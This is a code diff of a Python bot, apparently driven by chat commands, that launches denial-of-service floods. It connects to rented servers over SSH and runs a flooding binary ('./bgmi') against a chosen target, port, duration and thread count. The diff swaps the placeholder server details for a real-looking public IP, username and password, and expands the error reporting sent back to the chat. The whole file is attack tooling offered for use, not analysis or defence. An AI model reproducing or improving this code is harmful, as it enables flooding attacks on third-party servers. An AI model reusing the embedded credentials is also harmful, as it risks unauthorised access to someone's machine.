@@ -28,9 +28,9 @@ def generate_config_file():
     default_config = {
         "VPS_LIST": [
             {
-                "ip": "192.168.1.1",  # Replace with your default VPS IP
-                "user": "root",       # Replace with your default VPS username
-                "password": "password",  # Replace with your default VPS password
+                "ip": "45.79.124.184",  # Replace with your default VPS IP
+                "user": "master_zzjtzhszdf",       # Replace with your default VPS username
+                "password": "kTN2ppbkUthg",  # Replace with your default VPS password
                 "busy": False  # Initialize as not busy
             }
         ]
@@ -155,7 +155,7 @@ def handle_attack(chat_id, command):
 def execute_attack(vps, target, port, duration, threads, chat_id):
     """Execute an attack on the target using the selected VPS."""
     ip, user, password = vps["ip"], vps["user"], vps["password"]
-    attack_command = f"./raja {target} {port} {duration} {threads}"
+    attack_command = f"./bgmi {target} {port} {duration} {threads}"
 
     try:
         ssh = paramiko.SSHClient()
@@ -163,18 +163,22 @@ def execute_attack(vps, target, port, duration, threads, chat_id):
         ssh.connect(ip, username=user, password=password)
 
         stdin, stdout, stderr = ssh.exec_command(attack_command)
-        output, error = stdout.read().decode(), stderr.read().decode()
+        output = stdout.read().decode().strip()
+        error = stderr.read().decode().strip()
 
         ssh.close()
         vps["busy"] = False  # Mark VPS as free after attack
 
         if error:
-            send_message(chat_id, f"❌ **ATTACK FAILED FROM `{ip}`** 😡")
+            # Log the error and send it to the admin
+            error_message = f"❌ **ATTACK FAILED FROM `{ip}`** 😡\n\n**Error:**\n```\n{error}\n```"
+            send_message(chat_id, error_message)
         else:
             send_message(chat_id, f"✅ **ATTACK COMPLETED FROM `{ip}`** 💀🔥")
     except Exception as e:
         vps["busy"] = False
-        send_message(chat_id, f"❌ **ERROR:** {str(e)}")
+        error_message = f"❌ **ERROR:** {str(e)}"
+        send_message(chat_id, error_message)
 
 def handle_cvps(chat_id):
     """Handle the /cvps command."""
